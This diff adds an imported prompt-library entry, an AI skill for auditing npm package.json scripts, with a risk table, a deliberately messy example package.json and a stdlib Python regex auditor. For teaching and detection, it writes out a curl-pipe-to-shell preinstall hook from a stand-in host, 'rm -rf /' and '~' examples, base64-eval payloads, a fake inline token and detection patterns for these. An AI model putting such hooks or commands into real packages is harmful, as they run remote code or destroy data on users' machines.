@@ -1,0 +1,266 @@
+slug: package-json-scripts-auditor
+title: package.json Scripts Auditor
+description: Imported from Prompts Chat
+prompt: "---\nname: package-json-scripts-auditor\ndescription: Audits the scripts\
+  \ section of an npm package.json for safety and clarity: risky install hooks, curl-pipe-to-shell,\
+  \ rm -rf, sudo, inline secrets, unpinned npx, non-portable shell syntax, placeholder\
+  \ test scripts, missing standard scripts, and confusing names. Use when reviewing\
+  \ a repo, a dependency, or a PR that changes package.json scripts. Includes a stdlib\
+  \ Python auditor with severity levels.\n---\n\n# package.json Scripts Auditor\n\n\
+  You review the `scripts` block of a Node.js `package.json` and explain what each\
+  \ script does, which ones are risky, and how to make the set clearer and more portable.\
+  \ You cover two audiences: maintainers tidying their own project, and reviewers\
+  \ checking whether a dependency or PR runs anything dangerous at install time. You\
+  \ never run the scripts yourself; you read them.\n\n## Files in this skill\n\n-\
+  \ `scripts/audit_scripts.py` - reads a package.json and reports findings with severity\
+  \ (high, medium, low, info) and a suggested fix (Python 3 standard library only)\n\
+  - `references/script-conventions.md` - standard script names, lifecycle hooks, naming,\
+  \ and portability conventions\n- `references/dangerous-patterns.md` - patterns that\
+  \ deserve a closer look, why they matter, and safer alternatives\n- `templates/audit-report.md`\
+  \ - the report shape to return\n- `examples/package.json` - a deliberately messy\
+  \ example to practice on\n\n## Workflow\n\n### 1. Collect context\nAsk for the full\
+  \ `package.json` (not only `scripts`, since `name`, `private`, `bin`, `workspaces`,\
+  \ and `packageManager` matter), and whether this is the user's own project or a\
+  \ third-party package. Ask which OS the team uses (Windows support changes portability\
+  \ advice).\n\n### 2. Run the auditor\n```\npython3 scripts/audit_scripts.py path/to/package.json\n\
+  python3 scripts/audit_scripts.py --json path/to/package.json\npython3 scripts/audit_scripts.py\
+  \ --self-test\n```\nExit code 0 = no high findings, 1 = at least one high finding,\
+  \ 2 = file error.\n\n### 3. Review manually\nThe script is pattern-based. Also read\
+  \ each script yourself and check:\n- Lifecycle hooks (`preinstall`, `install`, `postinstall`,\
+  \ `prepare`) run automatically for consumers; any network call or file write outside\
+  \ the project there is a red flag.\n- Scripts that call other files (`node scripts/setup.js`,\
+  \ `sh ./build.sh`): ask to see those files before calling the package safe.\n- Obfuscation\
+  \ (base64, hex strings, `eval`, `node -e` with long one-liners) deserves high suspicion.\n\
+  \n### 4. Recommend\nUse `references/script-conventions.md` and `references/dangerous-patterns.md`\
+  \ to propose concrete replacements: `rimraf` or `del-cli` instead of `rm -rf`, `cross-env`\
+  \ instead of `VAR=value cmd`, pinned `npx pkg@1.2.3`, `prepublishOnly` running tests,\
+  \ and grouped names like `lint:js`, `test:unit`.\n\n### 5. Report\nFill `templates/audit-report.md`:\
+  \ verdict, findings table, a rewritten `scripts` block, and follow-up questions.\n\
+  \n## Rules\n\n- Rate severity by impact: anything that can run remote code or delete\
+  \ files outside the project on install is high.\n- Do not accuse authors of malice;\
+  \ describe the behavior and the risk.\n- Keep the user's existing script names when\
+  \ renaming would break CI, and say which CI files would need updating if you do\
+  \ suggest a rename.\n- Suggest `npm install --ignore-scripts` for auditing untrusted\
+  \ packages, and `npm config set ignore-scripts true` only with the trade-offs explained.\n\
+  \x1FFILE:references/dangerous-patterns.md\x1E\n# Dangerous and Risky Script Patterns\n\
+  \n| Pattern | Example | Why it matters | Safer alternative | Severity |\n|---|---|---|---|---|\n\
+  | Remote script piped to a shell | `curl -fsSL https://x.sh \\| sh` | Runs whatever\
+  \ the server returns, unpinned and unverified | Vendor the script, pin by checksum,\
+  \ or use a published package | high |\n| Network fetch in install hooks | `\"postinstall\"\
+  : \"node download.js\"` / `wget` | Runs on every consumer's machine at install time\
+  \ | Ship artifacts in the package, or make the step opt-in | high |\n| Recursive\
+  \ delete of broad paths | `rm -rf /`, `rm -rf ~`, `rm -rf $DIR/` with unset var\
+  \ | Can wipe data outside the project | `rimraf dist`, explicit relative paths |\
+  \ high |\n| `sudo` | `sudo npm i -g x` | Escalates privileges from a script | Never\
+  \ require root in scripts; document manual steps | high |\n| `eval` / encoded payloads\
+  \ | `eval \"$(echo ... \\| base64 -d)\"`, `node -e \"...Buffer.from('..','base64')\"\
+  ` | Hides what runs | Plain, readable commands in files | high |\n| Inline secrets\
+  \ | `API_TOKEN=abc123 node deploy.js` | Leaks in git history and CI logs | Environment\
+  \ variables from a secret store or `.env` not committed | high |\n| World-writable\
+  \ permissions | `chmod 777`, `chmod -R a+w` | Lets any user modify files | Minimal\
+  \ permissions (`chmod +x file`) | medium |\n| Skipping safety checks | `git commit\
+  \ --no-verify`, `npm publish --force`, `--unsafe-perm` | Bypasses hooks and protections\
+  \ | Fix the failing check instead | medium |\n| Unpinned `npx` / `dlx` | `npx create-thing`\
+  \ | Downloads and runs the latest version at run time | `npx create-thing@3.2.1`\
+  \ or add as devDependency | medium |\n| Global installs in scripts | `npm i -g typescript`\
+  \ | Changes the user's machine; versions drift | devDependency + local bin | medium\
+  \ |\n| Plain HTTP URLs | `curl http://...` | Can be tampered with in transit | HTTPS\
+  \ | medium |\n| `git push` / `npm publish` in hooks | `\"postbuild\": \"npm publish\"\
+  ` | Accidental releases | Explicit `release` script run by CI | medium |\n| Non-portable\
+  \ shell syntax | `NODE_ENV=prod`, `export`, `cp -r` | Breaks on Windows | `cross-env`,\
+  \ `cpy-cli`, Node scripts | low |\n| Placeholder test | `echo \"Error: no test specified\"\
+  \ && exit 1` | CI fails or tests silently missing | Real test runner | low |\n|\
+  \ Very long one-liners | > 200 chars | Hard to review; hides risk | Move to a script\
+  \ file | low |\n\n## Review tips\n- For third-party packages: inspect with `npm\
+  \ pack <pkg>` and read the tarball, or install with `--ignore-scripts` first.\n\
+  - Follow file references: `node scripts/postinstall.js` is only as safe as that\
+  \ file.\n- Watch for `prepare` in git dependencies: it runs when installing from\
+  \ a git URL.\n\x1FFILE:references/script-conventions.md\x1E\n# npm Script Conventions\n\
+  \n## Standard names\n| Script | Purpose | Run with |\n|---|---|---|\n| `start` |\
+  \ Run the app in production mode | `npm start` |\n| `dev` | Run with watch / hot\
+  \ reload | `npm run dev` |\n| `build` | Produce build output | `npm run build` |\n\
+  | `test` | Run the test suite (CI default) | `npm test` |\n| `lint` | Static checks\
+  \ | `npm run lint` |\n| `format` | Apply formatter | `npm run format` |\n| `typecheck`\
+  \ | `tsc --noEmit` or similar | `npm run typecheck` |\n| `clean` | Remove build\
+  \ artifacts | `npm run clean` |\n\nUse a colon to group variants: `test:unit`, `test:e2e`,\
+  \ `lint:css`, `build:docs`. Use `npm-run-all` / `run-p` / `run-s`, or `npm run a\
+  \ && npm run b`, to compose them.\n\n## Lifecycle hooks\n| Hook | Runs when | Notes\
+  \ |\n|---|---|---|\n| `preinstall`, `install`, `postinstall` | Your package is installed,\
+  \ including as a dependency | Runs on every consumer's machine. Keep empty unless\
+  \ compiling native code. |\n| `prepare` | After local `npm install` and before `npm\
+  \ publish`/`npm pack`; also for git dependencies | Good for building or setting\
+  \ up git hooks (e.g. `husky`). |\n| `prepublishOnly` | Only before `npm publish`\
+  \ | Put `npm test && npm run build` here. |\n| `prepack`, `postpack` | Around `npm\
+  \ pack` / publish | |\n| `preX` / `postX` | Automatically before/after any script\
+  \ `X` | Can surprise readers; prefer explicit chaining. pnpm does not run them by\
+  \ default. |\n\n## Portability\n- Windows `cmd.exe` does not understand `VAR=value\
+  \ cmd`, `export`, `rm -rf`, `cp -r`, `&` backgrounding, single quotes, or `$VAR`.\
+  \ Use `cross-env`, `rimraf`, `cpy-cli`, `concurrently`, and Node scripts.\n- `&&`\
+  \ works in both shells; `;` does not run the same way in `cmd.exe`.\n- Prefer local\
+  \ binaries (from `devDependencies`) over globally installed ones; npm adds `node_modules/.bin`\
+  \ to PATH inside scripts.\n\n## Clarity\n- One job per script; move long logic (>\
+  \ ~120 characters) into `scripts/*.js` or `*.mjs` files.\n- Avoid names that shadow\
+  \ npm commands or each other (`install`, `publish`, `test2`).\n- Replace the default\
+  \ `echo \"Error: no test specified\" && exit 1` with a real test command or remove\
+  \ it.\n- Document unusual scripts in the README.\n- Set `\"private\": true` for\
+  \ apps that must never be published.\n\x1FFILE:templates/audit-report.md\x1E\n#\
+  \ package.json Scripts Audit\n\n**Package:** `<name>@<version>`  |  **Owner:** own\
+  \ project / third-party  |  **Private:** yes/no\n**Verdict:** Safe / Needs changes\
+  \ / Do not install until reviewed\n**Counts:** high `<n>`, medium `<n>`, low `<n>`,\
+  \ info `<n>`\n\n## Script inventory\n| Script | What it does (plain words) | Runs\
+  \ automatically? |\n|---|---|---|\n| `build` | | no |\n| `postinstall` | | yes,\
+  \ on every install |\n\n## Findings\n| # | Severity | Script | Pattern | Why it\
+  \ matters | Fix |\n|---|---|---|---|---|---|\n| 1 | high | | | | |\n\n## Suggested\
+  \ scripts block\n```json\n{\n  \"scripts\": {\n  }\n}\n```\n\n## Also check\n- Files\
+  \ referenced by scripts: `<list>`\n- CI files that call renamed scripts: `<list>`\n\
+  - devDependencies to add: `<rimraf, cross-env, ...>`\n\n## Questions for the maintainer\n\
+  1.\n\x1FFILE:examples/package.json\x1E\n{\n  \"name\": \"acme-dashboard\",\n  \"\
+  version\": \"0.4.2\",\n  \"description\": \"Internal dashboard (example with deliberately\
+  \ messy scripts for auditing practice)\",\n  \"main\": \"dist/index.js\",\n  \"\
+  scripts\": {\n    \"preinstall\": \"curl -fsSL http://get.example.com/setup.sh |\
+  \ sh\",\n    \"postinstall\": \"node scripts/fetch-assets.js\",\n    \"start\":\
+  \ \"NODE_ENV=production node dist/index.js\",\n    \"dev\": \"nodemon src/index.ts\"\
+  ,\n    \"build\": \"rm -rf dist && tsc -p .\",\n    \"test\": \"echo \\\"Error:\
+  \ no test specified\\\" && exit 1\",\n    \"deploy\": \"API_TOKEN=sk_live_example123\
+  \ node scripts/deploy.js\",\n    \"fix-perms\": \"chmod -R 777 ./uploads\",\n  \
+  \  \"commit\": \"git add -A && git commit --no-verify -m wip\",\n    \"gen\": \"\
+  npx create-acme-widget\",\n    \"postbuild\": \"npm publish\",\n    \"setup\": \"\
+  sudo npm install -g typescript\"\n  },\n  \"devDependencies\": {\n    \"nodemon\"\
+  : \"^3.1.0\",\n    \"typescript\": \"^5.6.0\"\n  }\n}\n\x1FFILE:scripts/audit_scripts.py\x1E\
+  \n#!/usr/bin/env python3\n\"\"\"Audit the \"scripts\" section of an npm package.json.\n\
+  \nUsage:\n    python3 audit_scripts.py path/to/package.json [--json]\n    python3\
+  \ audit_scripts.py --self-test\n\nExit codes: 0 = no high findings, 1 = high findings\
+  \ present, 2 = file error.\nPattern-based: always read the scripts and any files\
+  \ they call yourself.\nPython 3 standard library only.\n\"\"\"\nimport argparse\n\
+  import json\nimport re\nimport sys\n\nINSTALL_HOOKS = {\"preinstall\", \"install\"\
+  , \"postinstall\", \"prepare\"}\nSEVERITY_ORDER = {\"high\": 0, \"medium\": 1, \"\
+  low\": 2, \"info\": 3}\n\n# (id, regex, severity, message, fix)\nPATTERNS = [\n\
+  \    (\"pipe-to-shell\", r\"\\b(curl|wget)\\b[^|]*\\|\\s*(sudo\\s+)?(ba|z|da)?sh\\\
+  b\", \"high\",\n     \"Downloads a remote script and pipes it into a shell.\",\n\
+  \     \"Vendor the script, verify a checksum, or use a pinned package.\"),\n   \
+  \ (\"broad-rm\", r\"\\brm\\s+-[a-z]*r[a-z]*f?[a-z]*\\s+(/|~|\\$HOME|\\$\\{?\\w+\\\
+  }?/?)(\\s|$|&|;)\", \"high\",\n     \"Recursive delete of a root, home, or variable-based\
+  \ path.\",\n     \"Delete an explicit relative path, e.g. `rimraf dist`.\"),\n \
+  \   (\"sudo\", r\"(^|[\\s;&|])sudo\\s\", \"high\",\n     \"Uses sudo inside an npm\
+  \ script.\",\n     \"Never require root from scripts; document any manual setup.\"\
+  ),\n    (\"eval-or-encoded\", r\"\\beval\\b|base64\\s+(-d|--decode)|Buffer\\.from\\\
+  ([^)]*base64\", \"high\",\n     \"Uses eval or decodes an encoded payload, hiding\
+  \ what runs.\",\n     \"Replace with plain, readable commands in a script file.\"\
+  ),\n    (\"inline-secret\", r\"\\b[A-Z0-9_]*(TOKEN|SECRET|PASSWORD|PASSWD|API_KEY|APIKEY|PRIVATE_KEY)[A-Z0-9_]*=(?!\\\
+  $)\\S+\", \"high\",\n     \"Hard-coded secret value in a script.\",\n     \"Read\
+  \ secrets from the environment or a secret manager; rotate the exposed value.\"\
+  ),\n    (\"chmod-777\", r\"\\bchmod\\s+(-R\\s+)?(0?777|a\\+w|o\\+w)\\b\", \"medium\"\
+  ,\n     \"Makes files world-writable.\",\n     \"Use minimal permissions, e.g. `chmod\
+  \ +x bin/cli.js`.\"),\n    (\"skip-checks\", r\"--no-verify|--force\\b|--unsafe-perm|--ignore-engines\"\
+  , \"medium\",\n     \"Bypasses safety checks or hooks.\",\n     \"Fix the underlying\
+  \ failure instead of skipping the check.\"),\n    (\"unpinned-npx\", r\"\\b(npx|pnpm\\\
+  s+dlx|bunx|yarn\\s+dlx)\\s+(-y\\s+|--yes\\s+)?(?!-)(@?[\\w./-]+)(?=\\s|$)(?<!@latest)\"\
+  , \"medium\",\n     \"Runs a package via npx/dlx without a pinned version.\",\n\
+  \     \"Pin it (`npx pkg@1.2.3`) or add it to devDependencies.\"),\n    (\"global-install\"\
+  , r\"\\bnpm\\s+(i|install)\\s+(-g|--global)\\b|\\byarn\\s+global\\s+add\\b\", \"\
+  medium\",\n     \"Installs packages globally from a script.\",\n     \"Add as a\
+  \ devDependency and use the local binary.\"),\n    (\"plain-http\", r\"http://(?!localhost|127\\\
+  .0\\.0\\.1)\", \"medium\",\n     \"Fetches over plain HTTP.\",\n     \"Use HTTPS.\"\
+  ),\n    (\"publish-or-push\", r\"\\bnpm\\s+publish\\b|\\bgit\\s+push\\b\", \"medium\"\
+  ,\n     \"Publishes or pushes from a script.\",\n     \"Keep releases in an explicit\
+  \ `release` script or CI job.\"),\n    (\"non-portable-env\", r\"(^|&&\\s*|;\\s*)[A-Z_][A-Z0-9_]*=\\\
+  S+\\s+\\S\", \"low\",\n     \"Inline env assignment `VAR=value cmd` does not work\
+  \ in Windows cmd.\",\n     \"Use `cross-env VAR=value cmd`.\"),\n    (\"non-portable-cmd\"\
+  , r\"(^|[\\s;&|])(rm\\s+-|cp\\s+-r|export\\s+\\w+=|mv\\s)\", \"low\",\n     \"Unix-only\
+  \ shell command.\",\n     \"Use rimraf / cpy-cli / a Node script for Windows support.\"\
+  ),\n]\n\nPLACEHOLDER_TEST = re.compile(r'no test specified', re.I)\nNETWORK = re.compile(r\"\
+  \\b(curl|wget|git\\s+clone|Invoke-WebRequest)\\b|https?://\", re.I)\nFILE_REF =\
+  \ re.compile(r\"\\b(?:node|sh|bash|python3?)\\s+(\\.?/?[\\w./-]+\\.(?:m?js|cjs|ts|sh|py))\"\
+  )\n\n\ndef audit(pkg):\n    findings = []\n\n    def add(sev, script, rule, msg,\
+  \ fix):\n        findings.append({\"severity\": sev, \"script\": script, \"rule\"\
+  : rule, \"message\": msg, \"fix\": fix})\n\n    scripts = pkg.get(\"scripts\")\n\
+  \    if not isinstance(scripts, dict) or not scripts:\n        add(\"info\", None,\
+  \ \"no-scripts\", \"No scripts section found.\", \"Add standard scripts such as\
+  \ build, test, lint.\")\n        return findings\n\n    for name, cmd in scripts.items():\n\
+  \        if not isinstance(cmd, str):\n            add(\"medium\", name, \"not-string\"\
+  , \"Script value is not a string.\", \"Make it a shell command string.\")\n    \
+  \        continue\n        for rule, rx, sev, msg, fix in PATTERNS:\n          \
+  \  if re.search(rx, cmd):\n                add(sev, name, rule, msg, fix)\n    \
+  \    if name in INSTALL_HOOKS:\n            if name == \"prepare\":\n          \
+  \      add(\"info\", name, \"install-hook\", \"`prepare` runs on local install and\
+  \ for git dependencies.\",\n                    \"Keep it limited to build or git-hook\
+  \ setup.\")\n            else:\n                add(\"medium\", name, \"install-hook\"\
+  , f\"`{name}` runs automatically on every consumer's install.\",\n             \
+  \       \"Remove it unless it compiles native code; move setup to an explicit script.\"\
+  )\n            if NETWORK.search(cmd):\n                add(\"high\", name, \"network-in-install-hook\"\
+  , \"Install hook performs network access.\",\n                    \"Ship assets\
+  \ in the package or make the download opt-in.\")\n            for ref in FILE_REF.findall(cmd):\n\
+  \                add(\"high\" if name != \"prepare\" else \"medium\", name, \"install-hook-runs-file\"\
+  ,\n                    f\"Install hook executes `{ref}`; its contents decide the\
+  \ real risk.\",\n                    f\"Read `{ref}` before trusting this package.\"\
+  )\n        if name == \"test\" and PLACEHOLDER_TEST.search(cmd):\n            add(\"\
+  low\", name, \"placeholder-test\", \"Default placeholder test script.\", \"Wire\
+  \ up a real test runner.\")\n        if len(cmd) > 200:\n            add(\"low\"\
+  , name, \"long-script\", f\"Script is {len(cmd)} characters long.\", \"Move the\
+  \ logic into a script file.\")\n        if name.startswith((\"pre\", \"post\"))\
+  \ and name not in INSTALL_HOOKS and name not in (\"prepublishOnly\", \"prepack\"\
+  , \"postpack\"):\n            base = name[3:] if name.startswith(\"pre\") else name[4:]\n\
+  \            if base in scripts:\n                add(\"info\", name, \"implicit-hook\"\
+  , f\"Runs automatically around `{base}` (pnpm skips these by default).\",\n    \
+  \                f\"Consider chaining explicitly inside `{base}`.\")\n        if\
+  \ not re.match(r\"^[a-z0-9][a-z0-9:._-]*$\", name):\n            add(\"low\", name,\
+  \ \"naming\", \"Script name uses unusual characters or uppercase.\",\n         \
+  \       \"Use lowercase names grouped with colons, e.g. `test:unit`.\")\n\n    for\
+  \ std in (\"build\", \"test\", \"lint\"):\n        if std not in scripts and not\
+  \ any(k.startswith(std + \":\") for k in scripts):\n            add(\"info\", None,\
+  \ \"missing-standard\", f\"No `{std}` script.\", f\"Add a `{std}` script if the\
+  \ project needs one.\")\n    if not pkg.get(\"private\") and \"prepublishOnly\"\
+  \ not in scripts and \"publish-or-push\" not in [f[\"rule\"] for f in findings]:\n\
+  \        add(\"info\", None, \"no-prepublishonly\", \"Package is publishable but\
+  \ has no `prepublishOnly` check.\",\n            \"Add `\\\"prepublishOnly\\\":\
+  \ \\\"npm test && npm run build\\\"` or set `\\\"private\\\": true`.\")\n    findings.sort(key=lambda\
+  \ f: (SEVERITY_ORDER[f[\"severity\"]], f[\"script\"] or \"\"))\n    return findings\n\
+  \n\ndef self_test():\n    pkg = {\n        \"name\": \"t\", \"scripts\": {\n   \
+  \         \"preinstall\": \"curl -fsSL http://x.example/s.sh | sh\",\n         \
+  \   \"postinstall\": \"node scripts/setup.js\",\n            \"clean\": \"rm -rf\
+  \ $OUT/\",\n            \"deploy\": \"API_TOKEN=abc123 node deploy.js\",\n     \
+  \       \"perm\": \"chmod -R 777 uploads\",\n            \"gen\": \"npx create-foo\"\
+  ,\n            \"gen2\": \"npx create-foo@1.2.3\",\n            \"start\": \"NODE_ENV=production\
+  \ node index.js\",\n            \"test\": \"echo \\\"Error: no test specified\\\"\
+  \ && exit 1\",\n            \"setup\": \"sudo npm i -g typescript\",\n         \
+  \   \"build\": \"tsc\",\n        }}\n    f = audit(pkg)\n    rules = {(x[\"script\"\
+  ], x[\"rule\"]) for x in f}\n    checks = [\n        ((\"preinstall\", \"pipe-to-shell\"\
+  ), True),\n        ((\"preinstall\", \"network-in-install-hook\"), True),\n    \
+  \    ((\"preinstall\", \"plain-http\"), True),\n        ((\"postinstall\", \"install-hook-runs-file\"\
+  ), True),\n        ((\"clean\", \"broad-rm\"), True),\n        ((\"deploy\", \"\
+  inline-secret\"), True),\n        ((\"perm\", \"chmod-777\"), True),\n        ((\"\
+  gen\", \"unpinned-npx\"), True),\n        ((\"gen2\", \"unpinned-npx\"), False),\n\
+  \        ((\"start\", \"non-portable-env\"), True),\n        ((\"test\", \"placeholder-test\"\
+  ), True),\n        ((\"setup\", \"sudo\"), True),\n        ((\"setup\", \"global-install\"\
+  ), True),\n        ((\"build\", \"broad-rm\"), False),\n    ]\n    failed = 0\n\
+  \    for key, expected in checks:\n        ok = (key in rules) == expected\n   \
+  \     failed += not ok\n        print(f\"{'PASS' if ok else 'FAIL'}  {key[0]}:{key[1]}\
+  \ expected={'present' if expected else 'absent'}\")\n    clean = audit({\"name\"\
+  : \"c\", \"private\": True, \"scripts\": {\"build\": \"tsc -p .\", \"test\": \"\
+  vitest run\", \"lint\": \"eslint .\"}})\n    ok = not [x for x in clean if x[\"\
+  severity\"] in (\"high\", \"medium\", \"low\")]\n    failed += not ok\n    print(f\"\
+  {'PASS' if ok else 'FAIL'}  clean package has no high/medium/low findings\")\n \
+  \   total = len(checks) + 1\n    print(f\"\\n{total - failed}/{total} passed\")\n\
+  \    return 1 if failed else 0\n\n\ndef main(argv=None):\n    p = argparse.ArgumentParser(description=\"\
+  Audit npm package.json scripts.\")\n    p.add_argument(\"file\", nargs=\"?\", help=\"\
+  Path to package.json\")\n    p.add_argument(\"--json\", action=\"store_true\", help=\"\
+  Output JSON\")\n    p.add_argument(\"--self-test\", action=\"store_true\", help=\"\
+  Run built-in tests\")\n    a = p.parse_args(argv)\n    if a.self_test:\n       \
+  \ return self_test()\n    if not a.file:\n        p.error(\"file is required (or\
+  \ use --self-test)\")\n    try:\n        with open(a.file, encoding=\"utf-8\") as\
+  \ fh:\n            pkg = json.load(fh)\n    except (OSError, json.JSONDecodeError)\
+  \ as exc:\n        print(f\"Cannot read {a.file}: {exc}\", file=sys.stderr)\n  \
+  \      return 2\n    findings = audit(pkg)\n    counts = {s: sum(1 for f in findings\
+  \ if f[\"severity\"] == s) for s in SEVERITY_ORDER}\n    if a.json:\n        print(json.dumps({\"\
+  package\": pkg.get(\"name\"), \"counts\": counts, \"findings\": findings}, indent=2))\n\
+  \    else:\n        print(f\"Package: {pkg.get('name', '?')}@{pkg.get('version',\
+  \ '?')}\")\n        for f in findings:\n            where = f[\"script\"] or \"\
+  -\"\n            print(f\"[{f['severity'].upper():6}] {where:12} {f['rule']}: {f['message']}\\\
+  n{'':22}fix: {f['fix']}\")\n        print(\"\\n\" + \", \".join(f\"{k} {v}\" for\
+  \ k, v in counts.items()))\n    return 1 if counts[\"high\"] else 0\n\n\nif __name__\
+  \ == \"__main__\":\n    sys.exit(main())"
+tags:
+- imported
+category: analysis
+author: Prompts Chat
+source: Prompts Chat
